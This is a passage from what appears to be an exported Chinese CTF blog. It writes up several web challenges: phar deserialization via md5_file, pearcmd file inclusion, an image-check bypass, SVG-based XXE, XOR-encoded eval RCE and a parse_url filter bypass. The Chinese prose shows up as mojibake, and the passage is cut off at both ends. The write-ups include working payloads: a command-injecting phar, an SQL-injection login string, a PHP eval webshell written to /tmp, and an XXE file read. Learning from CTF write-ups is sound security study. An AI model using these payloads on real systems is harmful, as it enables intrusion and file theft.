}\n      if (move_uploaded_file($_FILES['file']['tmp_name'], $filename)) {\n        echo \"<script>alert('å›¾ç‰‡ä¸Šä¼ æˆåŠŸ!');location.href='/index.php';</script>\";\n      } else {\n        die('failed');\n      }\n    }\n  }\n  else{\n    $filename = $_GET['file'];\n    if ($_GET['todo'] === \"md5\"){\n      echo md5_file($filename);\n    }\n    else {\n      $file = new FILE($filename);\n      if ($_GET['todo'] !== \"remove\" && $_GET['todo'] !== \"show\") {\n        echo \"<img src='../\" . $filename . \"'><br>\";\n        echo \"<a href='../index.php/?file=\" . $filename . \"&&todo=remove'>remove</a><br>\";\n        echo \"<a href='../index.php/?file=\" . $filename . \"&&todo=show'>show</a><br>\";\n      } else if ($_GET['todo'] === \"remove\") {\n        $file->remove();\n        echo \"<script>alert('å›¾ç‰‡å·²åˆ é™¤!');location.href='/index.php';</script>\";\n      } else if ($_GET['todo'] === \"show\") {\n        $file->show();\n      }\n    }\n  }\n}\n?>\n</body>\n</html>\n```\n\næºç é€»è¾‘ä¹Ÿæ¯”è¾ƒæ¸…æ¥š æˆ‘å¯„åœ¨äº†æ€ä¹ˆä¸€è¾¹ä¸Šä¼ æ–‡ä»¶ä¸€è¾¹postä¼ å‚\n\næ ¹æ®æºç é€»è¾‘ æˆ‘ä»¬å…ˆè¦ç™»å½•æˆåŠŸ ç„¶åæ‰èƒ½ä¸Šä¼ æ–‡ä»¶ æ‰€ä»¥postä¼ å‚å’Œå‘åŒ…åŒæ—¶å¼„ æˆ‘ä¸å¤ªä¼š \n\nå› ä¸ºè¿™ä¸ªé¢˜ç›®ç™»å½•æˆåŠŸä¹‹åè¿˜ä¼šé€€å‡ºæ¥ ä¸ä¼šç•™åœ¨ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ æ‰€ä»¥æˆ‘ä»¬è¦æ‰‹åŠ¨å‘åŒ… æˆ‘åªä¼šç”¨ç°æˆçš„è„šæœ¬\n\n```php\n    <!DOCTYPE html>\n    <html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>POSTæ•°æ®åŒ…POC</title>\n    </head>\n    <body>\n    <form action=\"http://e8a71e4c-c09f-4e5c-85ff-9c8df9323115.node4.buuoj.cn:81/index.php\" method=\"post\" enctype=\"multipart/form-data\">\n    <!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥-->\n        <label for=\"file\">æ–‡ä»¶åï¼š</label>\n        <input type=\"file\" name=\"file\" id=\"file\"><br>\n        <input type=\"submit\" name=\"submit\" value=\"æäº¤\">\n    </form>\n    </body>\n    </html>\n```\n\næ‰€ä»¥å°±å¯„äº† \n\nèµ›åçœ‹å¸ˆå‚…ä»¬çš„wp æ˜¯ç”¨pyè„šæœ¬çš„å‘çš„ çœŸçš„å¤ªå¼ºäº†\n\nç„¶åè¿™é“é¢˜ç›®æœ€æ˜æ˜¾çš„å°±æ˜¯ FILEç±»çš„ææ„å‡½æ•°å­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ç„¶åå°±èƒ½æƒ³åˆ°æ˜¯pharååºåˆ—åŒ–äº†\n\n```php\n  public function __destruct(){\n    system(\"ls -all \".$this->filename);\n  }\n```\n\né‚£ä¹ˆä¸€èˆ¬æˆ‘ä»¬pharååºåˆ—åŒ–è¿˜è¦é…åˆèƒ½å¤Ÿè§¦å‘ååºåˆ—åŒ–çš„æ–‡ä»¶æ“ä½œå‡½æ•°æ‰è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284296888-8b13e482-f7af-4f9f-9692-14afbbc72175.png)\n\nçœ‹äº†ä¸‹è¿™é“é¢˜ç›®æºç æ²¡æœ‰è¿™äº›å‡½æ•° ä½†æ˜¯è¿™æ¬¡åˆå­¦åˆ°ä¸€ä¸ªå‡½æ•°å°±æ˜¯md5_file()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284418928-34e41ed9-ef4a-46b1-9611-bca266194f9f.png)\n\nåœ¨æºç è¿™ä¸ªåœ°æ–¹ å¦‚æœæˆ‘ä»¬æäº¤getå‚æ•° fileå’Œtodo é‚£ä¹ˆä»–å°†ä¼šå°†æˆ‘ä»¬çš„æ–‡ä»¶è¿›è¡Œmd5_file()åè¾“å‡º\n\n```php\n    $filename = $_GET['file'];\n    if ($_GET['todo'] === \"md5\"){\n      echo md5_file($filename);\n```\n\né‚£ä¹ˆpharååºåˆ—åŒ–èƒ½å¤Ÿæ­é…çš„å‡½æ•°åˆå¤šäº†ä¸€ä¸ªqwq\n\næ‰€ä»¥æ€è·¯æ˜ç¡® å…ˆpharç”Ÿæˆä¸€ä¸ªåŒ…å«æˆ‘ä»¬æ¶æ„åºåˆ—åŒ–çš„å›¾ç‰‡\n\n```php\n<?php\n\nclass FILE{\n    public $filename;\n    public $lasttime;\n    public $size;\n    public function __construct($filename){\n        $this->filename = $filename;\n    }\n}\n\n$a = new FILE(\"/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd\");\n$phartest=new phar('phartest.phar',0);\n$phartest->startBuffering();\n$phartest->setMetadata($a);\n$phartest->setStub(\"<?php __HALT_COMPILER();?>\");\n$phartest->addFromString(\"test.txt\",\"test\");\n$phartest->stopBuffering();\n```\n\nç„¶åé…åˆè„šæœ¬ ä¸Šä¼ ä¸Šå» å·çš„https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247493970&idx=1&sn=9a20317104c56bd5060763e1461908ea&chksm=e8a1ca83dfd643954775d5e84a80a74876cde679a30db3e581d0bb1553510ada71937299318a&mpshare=1&scene=23&srcid=07256NyrGaLqc95MJJrprw2j&sharer_sharetime=1690256252504&sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd å¸ˆå‚…çœŸçš„å¤ªå¼ºäº†\n\n```python\nimport os\nimport requests\n# è·å–å½“å‰è„šæœ¬æ–‡ä»¶çš„ç›®å½•è·¯å¾„\ncurrent_directory = os.path.dirname(os.path.abspath(__file__))\n# æ„å»ºæ–‡ä»¶è·¯å¾„\nimage_path = os.path.join(current_directory, '1.jpg')\nproxy = {\n    \"http\": \"http://127.0.0.1:8080\"\n}\nburp0_url = \"http://e8a71e4c-c09f-4e5c-85ff-9c8df9323115.node4.buuoj.cn:81/?\"\nburp0_cookies = {\"PHPSESSID\": \"su\"}\nfiles = {\n    'file': ('1.jpg', open(image_path, 'rb'), 'image/jpeg')\n}\ndata = {\n    'username': \"x' or 1=1 or '='\",\n    'password': '1',\n    'submit': 'ç™»å½•'\n}\nres = requests.post(burp0_url, cookies=burp0_cookies, files=files, data=data, proxies=proxy)\nprint(res.text)\n#burp0_url = \"http://8ea14a59-3600-4799-a424-95e815a3d71f.node4.buuoj.cn:81/?file=phar:///var/www/html/1.jpg&todo=md5\"\n#res = requests.post(burp0_url,              cookies=burp0_cookies,data=data,proxies=proxy)\n#print(res.text)\n```\n\nå…ˆç™»å½•+ä¸Šä¼ æ–‡ä»¶ ç„¶åç™»å½•+pharåŒ…å«\n\néƒ½æ˜¯åŒæ—¶è¿›è¡Œæ¯ä¸€æ­¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284835271-ef78e974-b80b-42d8-ba3a-198e46ed4719.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284900264-277755df-bda5-45f3-8a7d-7ffc1906ae9e.png)\n\nåˆå­¦åˆ°äº† ä¹‹åè¦å¥½å¥½å­¦ä¸€ä¸‹requestsè¿™ä¸ªåº“å’Œå…¶ä»–å¸¸ç”¨åº“\n\n# ez_cms\n\nç†Šæµ·cms v1.0 æ–‡ä»¶åŒ…å«+pearcmd   ç¬¬ä¸€æ¬¡è§\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690190505171-21e3d749-3951-4d74-ab6a-360007a73ddf.png)\n\nå…³äºpearcmd:\n\n[https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/](https://w4rsp1t3.moe/2021/11/26/å…³äºåˆ©ç”¨pearcmdè¿›è¡Œæ–‡ä»¶åŒ…å«çš„ä¸€äº›æ€»ç»“/)\n\npayload:\n\nè¿™ä¸ªpearcmdçš„æ–‡ä»¶è·¯å¾„å¾ˆéš¾æ‰¾ è¦ä¸€ä¸ªä¸€ä¸ªè¯•\n\n```\n?+config-create+/&r=../../../../../../../../../../../../usr/share/php/pearcmd&/<?=phpinfo();eval($_POST[1]);?>+/tmp/123.php\n```\n\n`?r=../../../../../../../tmp/123`è®¿é—®rceå°±è¡Œäº†\n\nåæ­£æˆ‘æ²¡å¤ç°æˆåŠŸ æ„Ÿè§‰æ˜¯èµ›åé¶æœºå’Œæ¯”èµ›çš„ä¸ä¸€æ · rceä¸äº† è¿˜æ˜¯æˆ‘å§¿åŠ¿ä¸å¯¹ æ— è¯­äº†\n\n# ez_py\n\nè€ƒç‚¹ï¼šdjango session pickleååºåˆ—åŒ– \n\n ä¸å¤ªä¼š ä»¥åå†æ¥çœ‹ è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§\n\n# ez_timing\n\nHTTP/2??????? 6\n\n","categories":["å„èµ›äº‹WP"]},{"title":"buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰","url":"/post/d33f9f0e.html","content":"\nbuuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰ \n\n<!--more-->\n\nè¶Šæ¥è¶Šå¤æ‚ è¶Šæ¥è¶ŠåƒåŠ›äº† --^--\n\n# 113ã€[HarekazeCTF2019]Avatar Uploader 1\n\nä¸€é“æŒºæœ‰è¶£çš„é¢˜ç›®\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689577625490-fcbf4e82-bb82-4697-9017-5a1190e19d50.png)\n\nç™»å½•ä¸€ä¸‹ è®©æˆ‘ä»¬ä¸Šä¼ å¤´åƒ å¹¶ä¸”å›¾ç‰‡æ ¼å¼ä¸ºpng å¹¶ä¸”å¤§å°å°äº256x256\n\nok è¿™é“é¢˜ç›®æˆ‘å…¶å®æœ€å¤§çš„ç–‘æƒ‘æ˜¯æºç æ€ä¹ˆæ¥çš„ ä¹Ÿè®¸åªæ˜¯buuæ²¡ç»™æºç ï¼Ÿ\n\nç›´æ¥æ¥çœ‹æºç \n\n```ruby\n<?php\nerror_reporting(0);\n \nrequire_once('config.php');\nrequire_once('lib/util.php');\nrequire_once('lib/session.php');\n \n$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);\n \n// check whether file is uploaded\nif (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {\n    error('No file was uploaded.');\n}\n \n// check file size\nif ($_FILES['file']['size'] > 256000) {\n    error('Uploaded file is too large.');\n}\n \n// check file type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);//è·å–æ–‡ä»¶MIMEç±»å‹\n$type = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\nif (!in_array($type, ['image/png'])) {\n    error('Uploaded file is not PNG format.');\n}\n \n// check file width/height\n$size = getimagesize($_FILES['file']['tmp_name']);\nif ($size[0] > 256 || $size[1] > 256) {\n    error('Uploaded image is too large.');\n}\nif ($size[2] !== IMAGETYPE_PNG) {\n    // I hope this never happens...\n    error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n \n// ok\n$filename = bin2hex(random_bytes(4)) . '.png';\nmove_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);\n \n$session->set('avatar', $filename);\nflash('info', 'Your avatar has been successfully updated!');\nredirect('/');\n```\n\næœ€é‡è¦çš„æ˜¯è¿™ä¸¤éƒ¨åˆ†ï¼š\n\n```ruby\n// check file type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);//è·å–æ–‡ä»¶MIMEç±»å‹\n$type = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\nif (!in_array($type, ['image/png'])) {\n    error('Uploaded file is not PNG format.');\n}\n\n\n\n\n// check file width/height\n$size = getimagesize($_FILES['file']['tmp_name']);\nif ($size[0] > 256 || $size[1] > 256) {\n    error('Uploaded image is too large.');\n}\nif ($size[2] !== IMAGETYPE_PNG) {\n    // I hope this never happens...\n    error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n```\n\nç¬¬ä¸€éƒ¨åˆ†é€šè¿‡ finfo_file()æ¥è·å–mineä¿¡æ¯ è¦æ±‚æˆ‘ä»¬ä¸Šä¼ çš„æ˜¯pngå›¾ç‰‡\n\nç¬¬äºŒéƒ¨åˆ†getimagesize()æ¥è·å–å¤§å°å¹¶ä¸”ä¸åªæ˜¯å¤§å°è¿˜æœ‰å…¶ä»–å›¾ç‰‡ä¿¡æ¯ è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåŒ…å«å›¾ç‰‡ä¿¡æ¯çš„æ•°ç»„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578104255-28975875-7950-4504-9327-5b15c60952bb.png)\n\n```ruby\nif ($size[2] !== IMAGETYPE_PNG) {\n    // I hope this never happens...\n    error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n```\n\nå¹¶ä¸”åˆè¦æ±‚getimagesize()è·å–åˆ°å›¾ç‰‡ä¿¡æ¯ä¸­ä¸èƒ½ä¸ºpngå›¾ç‰‡ è¿™æ ·æ‰ä¼šç»™æˆ‘ä»¬flag\n\næ‰€ä»¥æ€»ç»“ä¸€ä¸‹å°±æ˜¯è¦æ±‚æˆ‘ä»¬ finfo_file()è·å–åˆ°mineä¸ºpngå›¾ç‰‡ ä½†æ˜¯getimagesize()è·å–åˆ°å›¾ç‰‡ä¿¡æ¯åˆä¸èƒ½ä¸ºpngå›¾ç‰‡\n\næ‰€ä»¥è¿™æ ·å¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦ç»•è¿‡getimagesize()ä¹Ÿå°±æ˜¯è®©`$size[2] !== IMAGETYPE_PNG`è¿™ä¸ªæ¡ä»¶æˆç«‹\n\né—®ä¸€ä¸‹gpt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578140917-e7bfeac6-bd41-4084-91de-0ac3d3137d68.png)\n\næˆ‘ä»¬å¯ä»¥è®©getimagesize()å‡½æ•°åœ¨è·å–å›¾ç‰‡ä¿¡æ¯çš„æ—¶å€™è®©å…¶å‡ºé”™ ä»è€Œä½¿å¾—è¿™ä¸ªæ¡ä»¶æˆç«‹ æˆåŠŸbypass\n\néšä¾¿æ‰¾ä¸€ä¸ªç¬¦åˆå…¶ä»–æ¡ä»¶çš„png å›¾ç‰‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578241021-d8677a96-be39-441b-80ea-27bfc18677cb.png)\n\nå°†é™¤äº†ç¬¬ä¸€è¡Œä»¥å¤–çš„å…¶ä»–ä¿¡æ¯å…¨éƒ¨åˆ é™¤ç”Ÿæˆä¸€å¼ pngå›¾ç‰‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578269747-e962712b-9a68-4004-adde-9f8db3b60f18.png)\n\nè¿™æ ·åªæœ‰æ–‡ä»¶å¤´éƒ¨æ˜¯æ­£å¸¸çš„getimagesize()è·å–ä¸åˆ°å›¾ç‰‡çš„å…¶ä»–ä¿¡æ¯ä»è€Œå‡ºé”™\n\næˆåŠŸï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578387080-53ad022c-e65d-4003-887e-d1d92ceab8d4.png)\n\n# 114ã€[BSidesCF 2019]SVGMagic\n\nSVGæ˜¯Scalable Vector Graphicsçš„ç¼©å†™,æ„ä¸ºå¯ç¼©æ”¾å‘é‡å›¾å½¢ã€‚å®ƒæ˜¯ä¸€ç§ä½¿ç”¨XMLæè¿°2Då›¾å½¢çš„å›¾åƒæ–‡ä»¶æ ¼å¼ã€‚\n\nä¹Ÿå°±æ˜¯è¯´SVGæ˜¯XMLæ–‡ä»¶  \n\né‚£ä¹ˆè¯´åˆ°xml ç«‹é©¬å°±èƒ½æƒ³åˆ°xxe å¦‚æœæˆ‘ä»¬åœ¨svgå›¾åƒä¸­æ’å…¥xxeæ¶æ„ä»£ç å‘¢ \n\nç›´æ¥å·å¸ˆå‚…çš„payloadï¼š\n\n```ruby\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"file:///proc/self/cwd/flag.txt\" >\n]>\n<svg height=\"100\" width=\"1000\">\n  <text x=\"10\" y=\"20\">&file;</text>\n</svg>\n```\n\nè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼š\n\nä¸€èˆ¬æˆ‘ä»¬è¿›è¡Œxxeçš„æ—¶å€™ï¼Œå®šä¹‰äº†å¤–éƒ¨å®ä½“è¿˜è¦é€šè¿‡`&`æ¥è°ƒç”¨è¿™ä¸ªå®ä½“ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®ä¸éœ€è¦ åªéœ€è¦ä¸Šä¼ ä¸Šå»ä¹‹åä»–ä¼šæ‰§è¡Œ ç„¶åå†æŠŠç»“æœåé¦ˆåˆ°pngå›¾åƒä¸­  å¯èƒ½è¿™å°±æ˜¯renderçš„é­…åŠ›å§:)\n\nè¿™é“é¢˜ç›®flagæ–‡ä»¶ä¸çŸ¥é“åœ¨å“ªé‡Œ\n\n`/proc/self/cwd`è¡¨ç¤ºå½“å‰è·¯å¾„ `/proc/self/root`è¡¨ç¤ºçš„æ˜¯`/`æ ¹ç›®å½•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689579753906-b0e3ebde-2b81-4cb3-a9f0-63176d7ea6fc.png)\n\n# 115ã€[ISITDTU 2019]EasyPHP\n\nä¸€é“å¥‡æ·«rceæ„é€ rceçš„é¢˜ç›® å…¶å®å°±æ˜¯å¼‚æˆ–æ„é€ +æ— å‚rce\n\n```ruby\n<?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET['_'];\nif ( preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', $_) )\n    die('rosÃ© will not do it');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n\neval($_);\n?>\n```\n\næ­£åˆ™wafäº†è¿™äº›\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689584978289-6c38ec2a-8a6f-4cf9-bac3-a3d6e45ad99b.png)\n\nå†æ¥çœ‹çœ‹è¿™éƒ¨åˆ†ï¼š\n\n```ruby\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n```\n\nstrtolower:å°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è½¬ä¸ºå°å†™\n\ncount_chars:è¿”å›å­—ç¬¦ä¸²æ‰€ç”¨å­—ç¬¦çš„ä¿¡æ¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585086139-4169ecf7-ab7b-45b8-86fc-f94a956ea8d4.png)\n\nè¿™é‡Œæ¨¡å¼ä¸º3æ‰€ä»¥è¿”å›æ‰€æœ‰ä½¿ç”¨äº†çš„å­—èŠ‚å€¼ç»„æˆçš„å­—ç¬¦ä¸²\n\nstrlen:è·å–å­—ç¬¦ä¸²é•¿åº¦\n\næ‰€ä»¥æ•´ä¸ªè¿™ä¸€éƒ¨åˆ†å°±æ˜¯è®¡ç®—æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²å­—ç¬¦ç±»å‹ä¸ªæ•° è·å–æˆ‘ä»¬æ€»å…±è¾“å…¥äº†å‡ ç§å­—ç¬¦\n\nçœ‹äº†è¿™é“é¢˜çš„wp ä¸»è¦æ˜¯å¾ˆéº»çƒ¦ æ ¸å¿ƒå°±æ˜¯é€šè¿‡å¼‚æˆ–æ¥æ„é€ webshell\n\n**è¿™é‡Œæœ‰ä¸ªå°tips ä¸€èˆ¬æˆ‘ä»¬æ„é€ å¼‚æˆ–payloadçš„æ—¶å€™éƒ½æ˜¯ä¸**`%ff`**å¼‚æˆ–æ¥è·å–å­—ç¬¦çš„**\n\nä¸€ä¸ªç®€å•çš„demoç†è§£å¼‚æˆ–æ„é€ \n\n```ruby\nphp > var_dump(@a^\"1\");\nstring(1) \"P\"\nphp > echo ord(\"a\");\n97\nphp > echo ord(\"1\");\n49\nphp > echo 97^49;\n80\nphp > echo chr(80);\nP\n```\n\né‚£ä¹ˆé—®é¢˜æ˜¯97^49ä¸ºä»€ä¹ˆæ˜¯80å‘¢ \n\nå…¶å®æ˜¯åè¿›åˆ¶å…ˆè½¬ä¸ºäºŒè¿›åˆ¶ ç„¶åä¸¤ä¸ªæ•°çš„æ¯ä¸€ä½äºŒè¿›åˆ¶ä¹‹é—´è¿›è¡Œå¼‚æˆ–å¾—åˆ°çš„æ•°å†è½¬ä¸ºåè¿›åˆ¶å°±æ˜¯ç»“æœ\n\n```ruby\n01100001 #97äºŒè¿›åˆ¶\n00110001 #49äºŒè¿›åˆ¶\n01010000 #æŒ‰ä½å¼‚æˆ–\n```\n\nå¯è§è¿™ä¸ªç»“æœå°±æ˜¯åè¿›åˆ¶çš„80\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585887772-568d3234-ea97-458e-9479-d40477f308b3.png)\n\nçœ‹äº†è¿™ç¯‡æ–‡ç« è¿˜æ˜¯å¾ˆä¸é”™çš„https://xz.aliyun.com/t/5677#toc-1\n\né‡Œé¢è¿˜æœ‰é€šè¿‡é`ï¼`æ¥è¿›è¡Œæ„é€ æ•°å­—payload çœŸçš„tql\n\n```php\n<?php\nvar_dump(@'a');\nvar_dump(@!'a');\nvar_dump(@!!'a');\nvar_dump(@!!'a'+@!!'a');\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586290324-cb408fc9-2f9f-4667-8971-6bec93fef49b.png)\n\næˆåŠŸæ„é€ å‡ºæ•°å­—2\n\nç„¶åè¿™é“é¢˜ç›®å°±æ˜¯ä¼šé™åˆ¶æˆ‘ä»¬çš„å­—ç¬¦ç±»å‹è¦åœ¨13ä»¥å†… å°±æ˜¯è¦å»æ‰¾åˆ«çš„å­—ç¬¦æ¥å‡å°‘payload è¿™ç‚¹å¾ˆéº»çƒ¦\n\nå…¶æ¬¡å°±æ˜¯æ— å‚rce\n\næ„é€ `print_r(scandir(.))`æ¥æ‰¾flagæ–‡ä»¶\n\npaylaod:`((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));`ä½†æ˜¯é‡Œé¢çš„å­—ç¬¦ç±»å‹è¶…è¿‡13äº†\n\nåˆ©ç”¨å·²ç»å­˜åœ¨çš„å­—ç¬¦å¼‚æˆ–æ¥æ›¿æ¢å‡å°‘å­—ç¬¦ç±»å‹\n\næŸ¥æ‰¾å¯ä»¥æ›¿æ¢çš„å­—ç¬¦\n\na = c^p^r \n\nd = s^c^t \n\nn = i^s^t\n\næ¯ä¸ªæ›¿æ¢å­—ç¬¦å†ä¸%ffå¼‚æˆ–ä¸€ä¸‹\n\nå¾—åˆ°ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586916100-cb946524-270b-4b18-a5bc-5f0df59a7c1f.png)\n\næœ€åæ„é€ ï¼š\n\n```\n((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));\n```\n\nå‘ç°flagæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586959408-c62cf98f-999c-4bf5-b00a-071047f80595.png)\n\nå†æ„é€ ï¼š `readfile(end(scandir(.)))` æ€è·¯å’Œä¸Šé¢ä¸€æ ·\n\npayload:`((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));`\n\nå‚è€ƒï¼šhttps://www.shawroot.cc/1209.html payloadéƒ½æ˜¯å·çš„è¿™ä¸ªå¤§ä½¬çš„qaq\n\n# 116ã€[FireshellCTF2020]Caas\n\nä¸€ä¸ªcè¯­è¨€æ–‡ä»¶åŒ…å«çš„é¢˜ç›® æ–°å¥‡\n\nä¸€å¼€å§‹ä»¥ä¸ºæ˜¯phpç¯å¢ƒæˆ–è€…python ç„¶åæœç´¢æŠ¥é”™ä¿¡æ¯ä¹‹åè¿”ç°æ˜¯cè¯­è¨€\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689589242051-f7b75cce-acff-450e-b3d1-cb3da4fe2d1c.png)\n\npayload:`#include \"/flag\"`\n\n# 117ã€[N1CTF 2018]eating_cms\n\nè€ƒç‚¹ï¼šparse_urlè§£ææ¼æ´\n\né¦–å…ˆåœ¨`/register.php`ä¸‹ç”³è¯·ä¸€ä¸ªè´¦å· è€å¥—è·¯äº† ç„¶åç™»å½•\n\nç„¶åçœ‹äº†ä¸‹è¯·æ±‚çš„ç½‘å€ å¾ˆåƒä»»æ„æ–‡ä»¶è¯»å–url\n\n```\n/user.php?page=php://filter/read=convert.base64-encode/resource=info\n```\n\nç”¨ä¼ªåè®®è¯»ä¸€ä¸‹ å¾—åˆ°ä»¥ä¸‹å†…å®¹\n\nindex.php\n\n```php\n<?php\nrequire_once \"function.php\";\nif(isset($_SESSION['login'] )){\n    Header(\"Location: user.php?page=info\");\n}\nelse{\n    include \"templates/index.html\";\n}\n?>\n```\n\nuser.php\n\n```php\n<?php\n  require_once(\"function.php\");\nif( !isset( $_SESSION['user'] )){\n  Header(\"Location: index.php\");\n\n}\nif($_SESSION['isadmin'] === '1'){\n  $oper_you_can_do = $OPERATE_admin;\n}else{\n  $oper_you_can_do = $OPERATE;\n}\n//die($_SESSION['isadmin']);\nif($_SESSION['isadmin'] === '1'){\n  if(!isset($_GET['page']) || $_GET['page'] === ''){\n    $page = 'info';\n  }else {\n    $page = $_GET['page'];\n  }\n}\nelse{\n  if(!isset($_GET['page'])|| $_GET['page'] === ''){\n    $page = 'guest';\n  }else {\n    $page = $_GET['page'];\n    if($page === 'info')\n    {\n      //            echo(\"<script>alert('no premission to visit info, only admin can, you are guest')</script>\");\n      Header(\"Location: user.php?page=guest\");\n    }\n  }\n}\nfilter_directory();\n//if(!in_array($page,$oper_you_can_do)){\n//    $page = 'info';\n//}\ninclude \"$page.php\";\n?>\n```\n\ninfo.php\n\n```php\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly \");\n}\ninclude \"templates/info.html\";\n?>\n```\n\nfunction.php\n\n```php\n<?php\nsession_start();\nrequire_once \"config.php\";\nfunction Hacker()\n{\n    Header(\"Location: hacker.php\");\n    die();\n}\n\n\nfunction filter_directory()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction filter_directory_guest()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction Filter($string)\n{\n    global $mysqli;\n    $blacklist = \"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\";\n    $whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><\";\n    for ($i = 0; $i < strlen($string); $i++) {\n        if (strpos(\"$whitelist\", $string[$i]) === false) {\n            Hacker();\n        }\n    }\n    if (preg_match(\"/$blacklist/is\", $string)) {\n        Hacker();\n    }\n    if (is_string($string)) {\n        return $mysqli->real_escape_string($string);\n    } else {\n        return \"\";\n    }\n}\n\nfunction sql_query($sql_query)\n{\n    global $mysqli;\n    $res = 